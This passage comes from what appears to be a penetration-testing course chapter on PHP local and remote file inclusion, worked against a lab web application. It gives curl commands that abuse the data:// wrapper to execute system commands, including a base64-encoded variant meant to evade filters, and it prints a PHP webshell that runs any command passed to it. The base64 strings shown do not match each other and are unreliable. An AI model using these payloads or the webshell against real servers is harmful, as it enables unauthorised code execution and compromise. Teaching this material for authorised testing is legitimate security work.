While the php://filter wrapper can be used to include the contents of a file, we can use the data wrapper to achieve code execution. This wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application.

Let's demonstrate how to use the data wrapper with the "Mountain Desserts" web application. To use the wrapper, we will add data:// followed by the type and content. In our first example, we will try to embed a small PHP snippet into the web application's code. We can use the same PHP snippet as follows the command:

```
kali@kali~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php system('ls');"
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
```

Listing 151 - Usage of "data://" wrapper to execute ls

Listing 151 shows that our embedded data was successfully executed via the File Inclusion vulnerability. When application firewalls or other security mechanisms are in place, they may filter strings like "system". In such a scenario, we can try to use the data wrapper with base64-encoded data. We will first encode the PHP snippet into base64, and then use curl to embed and execute via the data wrapper.

```
kali@kali~$ echo "<?php system($_GET[\"cmd\"]);" | base64
PD9waHBzeSB5c3RlbGVtKSRfR0VVCCJjbcp==

kali@kali~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHBzeSB5c3RlbGVtKSRfR0VVCCJkJcp==&cmd=ls"
```

## 9.2.3 Remote File Injection (RFI)

Remote file injection (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the allow_url_include option needs to be enabled to leverage RFI, just as the data wrapper from the previous section. As stated, it is disabled by default in all versions of PHP. While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB. The included file is also executed in the context of the web application. Common scenarios where we will find this option enabled is when the web application loads contents from remote systems e.g. libraries or application data. We can discover RFI vulnerabilities using the same techniques covered in Directory Traversal and LFI sections

Kali Linux includes several PHP webshells in the `/usr/share/webshells/php/` directory that can be used for RFI. A webshell is a small script that provides a web similar to the command line interface, making it easier and more convenient to execute commands. In this example, we use the simple-backdoor.php webshell to exploit an RFI vulnerability in the "Mountain Desserts" web application.

First, let's review the contents of the simple-backdoor.php webshell. We'll use this to test the LFI vulnerability from the previous sections for RFI. The code is very similar to the PHP snippet used in previous sections. It accepts commands in the cmd parameter and executes them via the system function.

```
kali@kali:/usr/share/webshells/php$ cat simple-backdoor.php
...
```

```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
```
